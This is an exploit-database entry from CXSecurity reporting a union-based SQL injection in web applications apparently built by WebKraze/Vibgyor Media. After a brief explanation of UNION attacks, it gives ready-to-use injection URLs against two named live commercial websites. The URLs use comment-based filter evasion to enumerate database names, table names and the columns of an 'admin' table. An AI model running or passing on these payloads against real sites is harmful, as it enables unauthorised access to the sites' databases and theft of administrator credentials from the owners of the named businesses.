---
title: WebKraze,Vibgyor Media Web Application Union-based Sql Injection
url: https://cxsecurity.com/issue/WLB-2025010012
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-01-10
fetch_date: 2025-10-06T20:05:53.872726
---

# WebKraze,Vibgyor Media Web Application Union-based Sql Injection

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **WebKraze,Vibgyor Media Web Application Union-based Sql Injection** **2025.01.09**  **![ir](https://cert.cx/cxstatic/images/flags/ir.png) [Razi](https://cxsecurity.com/author/Razi/1/) **(IR)** ![ir](https://cert.cx/cxstatic/images/flags/ir.png)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

# Exploit Title: WebKraze,Vibgyor Media Web Application Union-based Sql Injection
# Date: 2024-12-25
# Exploit Author: Parastou Razi
# Contact: razi.parastoo@gmail.com
#Category:webapps
#Tested On: Windows, Firefox
Proof of Concept:
1. Description:
When an application is vulnerable to SQL injection, and the results of the query are returned within the application's responses, you can use the UNION keyword to retrieve data from other tables within the database. This is commonly known as a SQL injection UNION attack.
Union-based SQLi – the attacker uses the UNION operator to combine a benign SQL statement with a malicious statement. The malicious statement must use the same columns and data types as the original statement. A vulnerable database processes the combined statement and executes the malicious code.
[+] For UNION-Based Sql Injection first add "'" to the end of the link and page information will change :
https://www.alikhalafforklifts.com/products.php?id=22
https://www.alikhalafforklifts.com/products.php?id=22'
https://www.airporttaxiforsure.com/local-taxi-hire-booking?id=1093
https://www.airporttaxiforsure.com/local-taxi-hire-booking?id=1093'
2. Proof
#Demo 1:
https://www.alikhalafforklifts.com/products.php?id=-22%27%20/\*!12345union\*/%20select%201,database(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23/\*!froM\*/information\_schema.schemata%23--+
http://www.alikhalafforklifts.com/products.php?id=-22%27%20/\*!12345union\*/%20select%201,table\_name,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23/\*!FROM\*/information\_schema./\*!tables\*/%20WHERE%20table\_schema=%22vibgyorm\_alikhalif%22%23--+
#Demo2:
https://www.airporttaxiforsure.com/local-taxi-hire-booking?id=-1093%27%20/\*!12345UNION\*/%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,database(),17,18,19,20,21,22,23,24,25,26,27/\*!FROM\*/%20information\_schema.schemata--+
https://www.airporttaxiforsure.com/local-taxi-hire-booking?id=-1093%27/\*!12345UNION\*/%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,table\_name,17,18,19,20,21,22,23,24,25,26,27/\*!FROM\*/information\_schema./\*!tables\*/%20WHERE%20table\_schema=%22wwwwegoc\_atforsure%22--+
https://www.airporttaxiforsure.com/local-taxi-hire-booking?id=-1093%27/\*!12345UNION\*/%20SELECT%201,2,3,4,5,6,7,8,9,10,11,12,13,14,15,column\_name,17,18,19,20,21,22,23,24,25,26,27/\*!FROM\*/%20information\_schema.columns%20WHERE%20table\_name=%22admin%22%23

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025010012)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top